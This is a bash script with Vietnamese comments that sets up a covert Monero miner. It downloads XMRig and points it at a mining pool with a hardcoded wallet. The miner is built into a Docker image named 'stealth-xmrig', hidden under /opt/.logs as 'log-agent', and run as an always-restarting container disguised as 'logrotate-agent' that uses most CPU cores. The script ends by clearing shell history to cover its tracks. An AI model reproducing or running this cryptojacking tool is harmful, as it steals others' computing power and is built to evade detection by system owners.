#!/bin/bash

# ========== KIỂM TRA PHỤ THUỘC ========== 
command -v docker >/dev/null || { echo "❌ Docker chưa cài."; exit 1; }
command -v curl >/dev/null || { echo "❌ curl chưa cài."; exit 1; }
command -v bc >/dev/null || { echo "❌ bc chưa cài. Cài đặt bc..."; sudo apt-get update && sudo apt-get install -y bc; }

# ========== CẤU HÌNH ========== 
WALLET=${WALLET:-85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz} 
CONTAINER_NAME=${CONTAINER_NAME:-logrotate-agent} 
IMAGE_NAME=${IMAGE_NAME:-stealth-xmrig} 

# ========== LẤY SỐ CORE CPU VÀ TÍNH THREAD_HINT ========== 
CPU_CORES=$(nproc)                              # Lấy số lượng lõi CPU
THREAD_HINT=$(echo "$CPU_CORES * 0.8" | bc)     # Dùng 80% lõi

# ========== URL VÀ SHA256 CỦA BẢN XMRig LINUX STATIC ========== 
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"  # :contentReference[oaicite:0]{index=0}
EXPECTED_SHA256="b2c88b19699e3d22c4db0d589f155bb89efbd646ecf9ad182ad126763723f4b7"                         # :contentReference[oaicite:1]{index=1}

# ========== DỌN DẸP CŨ ========== 
docker rm -f "$CONTAINER_NAME" 2>/dev/null

# ========== UNMASK + KHỞI ĐỘNG DOCKER ========== 
sudo systemctl unmask docker
sudo systemctl unmask docker.socket
sudo systemctl unmask containerd.service

if ! sudo systemctl is-active --quiet docker; then
  echo "❌ Docker daemon chưa chạy. Khởi động Docker..."
  sudo systemctl start docker || { echo "❌ Không thể khởi động Docker."; exit 1; }
fi

# ========== TẠO THƯ MỤC TẠM ========== 
WORKDIR=$(mktemp -d)
cd "$WORKDIR" || exit 1

# ========== TẢI VÀ KIỂM TRA HASH ========== 
echo "[*] Tải XMRig Linux static..."
curl -L -o xmrig.tar.gz "$XMRIG_URL"

ACTUAL_SHA256=$(sha256sum xmrig.tar.gz | awk '{ print $1 }')
if [ "$ACTUAL_SHA256" != "$EXPECTED_SHA256" ]; then
  echo "❌ Hash không khớp (đã tải: $ACTUAL_SHA256). File có thể bị sửa đổi."
  exit 1
fi
echo "[✓] Đã kiểm tra SHA256 thành công."

# ========== GIẢI NÉN VÀ DI CHUYỂN BINARY ========== 
tar -xf xmrig.tar.gz

XMRIG_BIN=$(find . -type f -name xmrig | head -n1)
if [ -z "$XMRIG_BIN" ]; then
  echo "❌ Không tìm thấy binary xmrig sau khi giải nén."
  exit 1
fi

mv "$XMRIG_BIN" ./xmrig
chmod +x ./xmrig

# ========== TẠO FILE CẤU HÌNH ========== 
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "max-threads-hint": $THREAD_HINT,
    "priority": 0
  },
  "pools": [
    {
      "url": "supportxmr.com:443",
      "user": "$WALLET",
      "tls": true
    }
  ]
}
EOF

# ========== TẠO Dockerfile ========== 
cat > Dockerfile <<EOF
FROM ubuntu:20.04

RUN apt-get update && \
    apt-get install -y libhwloc-dev curl unzip && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

WORKDIR /opt/.logs
COPY xmrig /opt/.logs/log-agent
COPY config.json /opt/.logs/config.json

RUN chmod 700 /opt/.logs/log-agent && chmod 600 /opt/.logs/config.json

ENTRYPOINT ["/opt/.logs/log-agent", "--config=/opt/.logs/config.json"]
EOF

# ========== BUILD DOCKER IMAGE ========== 
echo "[*] Build Docker image..."
docker build -t "$IMAGE_NAME" . || { echo "❌ Build thất bại"; exit 1; }

# ========== CHẠY CONTAINER ========== 
echo "[*] Chạy container '$CONTAINER_NAME'..."
docker run -d --name "$CONTAINER_NAME" \
  --cpus="0.8" --memory="20000m" \
  --restart=always \
  --detach \
  --log-driver=syslog \
  "$IMAGE_NAME"

# ========== XOÁ DỌN DUYỆT VÀ LỊCH SỬ ========== 
cd ~
rm -rf "$WORKDIR"
history -c && history -w

echo "[✓] Hoàn tất. Container '$CONTAINER_NAME' đang chạy."
